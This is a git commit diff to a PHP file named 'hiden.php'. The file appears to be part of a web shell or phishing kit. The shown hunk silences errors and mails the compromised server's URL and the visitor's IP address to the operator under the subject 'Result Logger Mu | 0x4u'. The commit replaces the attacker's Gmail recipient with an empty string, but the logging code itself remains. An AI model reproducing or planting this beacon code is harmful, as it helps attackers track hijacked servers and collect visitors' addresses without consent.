2397d35a5077f1dbb4061e768555144c6c453ec7
kamrwercg <142719358+kamrwercg@users.noreply.github.com>
2024-06-20 13:02:42 -0700

    Update hiden.php

--- hiden.php
+++ hiden.php
@@ -122,7 +122,7 @@ error_reporting(0);
 @ini_set('display_errors', 0);
 ini_set('memory_limit', '64M');
 header('Content-Type: text/html; charset=UTF-8');
-$to = 'pockyitss@gmail.com';
+$to = '';
 $path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($to, "Result Logger Mu | 0x4u", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
